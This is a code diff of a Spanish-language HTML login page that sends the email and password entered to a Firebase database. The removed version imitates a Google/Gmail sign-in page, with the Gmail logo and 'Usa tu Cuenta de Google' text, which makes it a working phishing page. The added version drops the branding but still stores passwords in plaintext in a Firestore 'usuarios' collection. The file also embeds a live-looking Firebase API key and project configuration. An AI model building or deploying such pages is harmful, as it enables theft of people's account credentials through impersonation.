@@ -1,84 +1,47 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Iniciar sesión - Google</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Iniciar sesión</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
+      background-color: #f3f3f3;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
-    .login-box {
-      background: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 400px;
+    form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .login-box h2 {
-      margin: 0 0 10px;
-    }
-    .login-box img {
-      width: 75px;
-      margin-bottom: 10px;
-    }
-    .input-group {
-      margin-bottom: 20px;
-    }
-    .input-group label {
+    input {
       display: block;
-      margin-bottom: 5px;
-    }
-    .input-group input {
+      margin-bottom: 15px;
       width: 100%;
       padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
     }
-    .btn {
-      background-color: #1a73e8;
-      color: white;
-      padding: 10px 15px;
-      border: none;
-      width: 100%;
-      border-radius: 4px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .btn:hover {
-      background-color: #155ac1;
+    button {
+      padding: 10px 20px;
     }
   </style>
 </head>
 <body>
-
-  <form class="login-box" id="formulario">
-    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Logo de Gmail">
+  <form id="loginForm">
     <h2>Iniciar sesión</h2>
-    <p>Usa tu Cuenta de Google</p>
-
-    <div class="input-group">
-      <label for="correo">Correo electrónico</label>
-      <input type="email" id="correo" name="correo" required>
-    </div>
-
-    <div class="input-group">
-      <label for="clave">Contraseña</label>
-      <input type="password" id="clave" name="clave" required>
-    </div>
-
-    <button type="submit" class="btn">Siguiente</button>
+    <input type="email" id="email" placeholder="Correo electrónico" required />
+    <input type="password" id="password" placeholder="Contraseña" required />
+    <button type="submit">Enviar</button>
+    <p id="msg" style="color: green;"></p>
   </form>
 
   <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-firestore-compat.js"></script>
 
   <script>
     // Tu configuración de Firebase
@@ -86,7 +49,7 @@
       apiKey: "AIzaSyAeYcdtKNuEMhV9F13dx8hl9VTw1AD6_g4",
       authDomain: "loginapp-97da2.firebaseapp.com",
       projectId: "loginapp-97da2",
-      storageBucket: "loginapp-97da2.firebasestorage.app",
+      storageBucket: "loginapp-97da2.appspot.com",
       messagingSenderId: "1071075004144",
       appId: "1:1071075004144:web:67e75c55c7d4836e59fc35",
       measurementId: "G-H7B3WQ834E"
@@ -94,27 +57,32 @@
 
     // Inicializar Firebase
     firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    const db = firebase.firestore();
 
-    // Enviar datos al hacer submit
-    document.getElementById('formulario').addEventListener('submit', function(e) {
+    // Manejo del formulario
+    const form = document.getElementById('loginForm');
+    const msg = document.getElementById('msg');
+
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      const correo = document.getElementById('correo').value;
-      const clave = document.getElementById('clave').value;
-      const fecha = new Date().toLocaleString();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
 
-      // Guardar en la base de datos
-      database.ref('usuarios').push({
-        correo: correo,
-        clave: clave,
-        fecha: fecha
-      });
+      try {
+        await db.collection("usuarios").add({
+          correo: email,
+          contraseña: password,
+          fecha: new Date()
+        });
 
-      alert("Datos enviados correctamente.");
-      document.getElementById('formulario').reset();
+        msg.textContent = "¡Datos enviados correctamente!";
+        form.reset();
+      } catch (error) {
+        msg.textContent = "Error al enviar los datos.";
+        console.error("Error guardando en Firebase:", error);
+      }
     });
   </script>
-
 </body>
 </html>
